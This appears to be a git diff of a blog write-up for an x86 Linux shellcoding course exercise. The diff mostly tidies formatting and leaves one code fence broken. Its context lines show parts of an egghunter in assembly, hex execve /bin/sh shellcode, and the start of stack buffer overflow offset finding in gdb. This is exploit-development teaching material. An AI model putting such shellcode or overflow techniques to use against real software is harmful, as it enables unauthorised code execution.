@@ -13,7 +13,6 @@ tags:
   - SLAE
   - Linux
   - x86
-  - Shellcoding
   - Shellcode
 ---
 ![](/assets/images/SLAE32.png)
@@ -44,8 +43,9 @@ _start:
 	mov al, 11
 	int 0x80
 ```
-This is the assembly code of the egghunter I created. It is heavily influenced by Skapes egghunter.
-```nasm
+This is the assembly code of the egghunter I created. It is heavily influenced by Skapes egghunter.  
+
+``nasm
 global _start
 _start:
         mov ebx, 0x50905090             ; EGG - 0x90 is NOP, 0x50 is push eax. Executable, no consequence instructions
@@ -75,7 +75,9 @@ nextAddress:                            ; Increments the memory address stored i
         jnz nextAddress
         jmp edx
 ```
+
 I then comipled both the egghunter and the execve assembly code.  
+
 ```console
 nasm -f elf32 eggHunter.nasm -o eggHunter.o
 ld eggHunter.o -o eggHunter
@@ -83,6 +85,7 @@ nasm -f elf32 execve.nasm -o execve.o
 ld execve.o -o execve
 ```
 Once both the programs were compiled I used my object dump bash script to extract the shellcode in hex.
+
 ```bash
 #!/bin/bash
 # Filename: objdump2hex.sh
@@ -99,7 +102,9 @@ root# ./objdump2hex.sh
 root# ./objdump2hex.sh execve
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 ```
+
 To combine the egghunter with the shellcode, and to define an egg to hunt for, I created a simple C program.  
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -161,6 +166,7 @@ void pb(char *buf)
 
 After compiling the program I needed to find the offset for the stack buffer overflow.  
 I used GDB with the peda plugin to generate a unique sting to overflow the buffer.  
+
 ```console
 gdb ./ezbof
 gdb-peda$ pattern_create 100
